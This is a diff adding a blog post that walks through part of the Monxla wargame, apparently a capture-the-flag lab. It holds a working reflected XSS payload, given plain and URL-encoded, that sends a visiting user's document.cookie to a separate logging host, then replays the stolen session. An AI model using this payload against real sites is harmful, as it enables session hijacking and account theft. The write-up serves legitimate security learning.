@@ -100,7 +100,112 @@
       
 
 
-        
+        <div id="main">
+          <div id="content">
+            <div>
+              <article class="hentry" role="article">
+
+                
+                
+
+                <div class="entry-content">
+                  
+                  
+                  <p>In the previous post, I showed how to get the PDF that outlines the services running on the Monxla VM image. This article will continue where that one left off.</p>
+
+<!-- more -->
+
+<p>Firstly, the PDF explains that there are 2 virtual hosts enabled on the machine. To configure my machine for these virtual hosts, I added these lines to my /etc/hosts file:</p>
+
+<pre><code>192.168.188.134 nasenko.otw
+192.168.188.134 honeylink.otw
+</code></pre>
+
+<p>There are 2 sites immediately available to you:</p>
+
+<ul>
+<li>The HoneyLink site is, so far, just a convenience for the wargame, so you don&rsquo;t have to setup your own HTTP server.  It gives you a prefix URL, that you can prepend anything you want to the end.  It will then show you the responses as they come in. 
+<figure class="img-responsive">
+    
+        <img src="/img/monxla2_2.png" />
+    
+    
+</figure>
+</li>
+<li>The Nasenko home page. This is what appears to be the main application that we are attacking. It has a Bookmark Service, and the Notes service, which were referenced in the PDF, immediately visible. 
+<figure class="img-responsive">
+    
+        <img src="/img/monxla2_1.png" />
+    
+    
+</figure>
+</li>
+</ul>
+
+<p>After poking around a bit, I found that you are unable to access the Notes service, since you&rsquo;re not logged in. Per the blog article on the main page, login attempts are disabled. On the Bookmarks page, it says that the submitted bookmarks are being visited routinely. These two statements combined immediately made me think of using a <a href="https://en.wikipedia.org/wiki/Session_hijacking">Session Hijacking</a> attack to steal the session of the user already logged in, checking the submitted bookmarks.</p>
+
+<p>To get started with my attack, I tried submitting several bookmarks, which were always rejected.  There was some sort of filtering going on, on the server side.  For some reason, I decided to try submitting the Nasenko site itself, and saw that it was actually accepted.  This means that I could at least submit data, as long as it was from the same website.  From there, that made me start thinking about finding a <a href="https://en.wikipedia.org/wiki/Cross-site_scripting">Cross-Site Scripting</a> vulnerability, so that I could redirect the traffic, and combine it with the Session Hijack attack.</p>
+
+<p>After searching for a bit, I found a Cross-Site Scripting vulnerability in the User Info page.  It wasn&rsquo;t cleanly filtering user input, so I was able to inject javascript into the &ldquo;username&rdquo; parameter.</p>
+
+
+<figure class="img-responsive">
+    
+        <img src="/img/monxla2_3.png" />
+    
+    
+</figure>
+
+
+<p>To combine these two attacks, I crafted a URL that would use the Cross-Site Scripting attack to allow me to submit it from the proper host, as well as stealing the user&rsquo;s cookie:</p>
+
+<pre><code>http://nasenko.otw/userinfo.php?username=&lt;script&gt;document.location='http://honeylink.otw/tH3zwj4P1z/cookie'+document.cookie;&lt;/script&gt; 
+</code></pre>
+
+<p>However, due to some URL encoding issues (mainly the &ldquo;+&rdquo; splitting the parameter), I had to URL encode it using the <a href="http://portswigger.net/burp/">Burp Suite</a>:</p>
+
+<pre><code>http://nasenko.otw/userinfo.php?username=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%68%6f%6e%65%79%6c%69%6e%6b%2e%6f%74%77%2f%74%48%33%7a%77%6a%34%50%31%7a%2f%63%6f%6f%6b%69%65%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3b%3c%2f%73%63%72%69%70%74%3e
+</code></pre>
+
+<p>I submitted the URL to the Bookmark Service, and it gladly accepted it.  I then switched to the HoneyLink page, and clicked the &ldquo;Refresh&rdquo; button, and saw that my click had indeed been registered.  And lucky for me, it had the cookie listed:</p>
+
+
+<figure class="img-responsive">
+    
+        <img src="/img/monxla2_4.png" />
+    
+    
+</figure>
+
+
+<p>I then added a cookie with the stolen value.</p>
+
+
+<figure class="img-responsive">
+    
+        <img src="/img/monxla2_5.png" />
+    
+    
+</figure>
+
+
+<p>When I then went to the Notes Service, which previously denied me access, I was able to view them. This meant it was successful. We successfully stole a valid user&rsquo;s session.</p>
+
+
+<figure class="img-responsive">
+    
+        <img src="/img/monxla2_6.png" />
+    
+    
+</figure>
+
+
+                </div>
+                
+              </article>
+            </div>
+          </div>
+        </div>
 
 
       
@@ -184,15 +289,8 @@
 		<span class="labelpost" data-label="Magazine" data-no="4"></span>
 	</div>
 	<div class='clear'></div>
-	<span class='widget-item-control'>
-		<span class='item-control blog-admin'>
-			<a class='quickedit' href='//www.blogger.com/rearrange?blogID=3868080948025121998&widgetType=HTML&widgetId=HTML2&action=editWidget&sectionId=sidebar' onclick='return _WidgetManager._PopupConfig(document.getElementById("HTML2"));' target='configHTML2' title='Edit'>
-				<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
-			</a>
-		</span>
-	</span>
-	<div class='clear'></div>
 </div>
+
         <div class='widget Label' data-version='1' id='Label1'>
 	<h2>Categories</h2>
 	<div class='widget-content cloud-label-widget-content'>
@@ -637,3 +735,4 @@
 		
 	</body>
 </html>
+
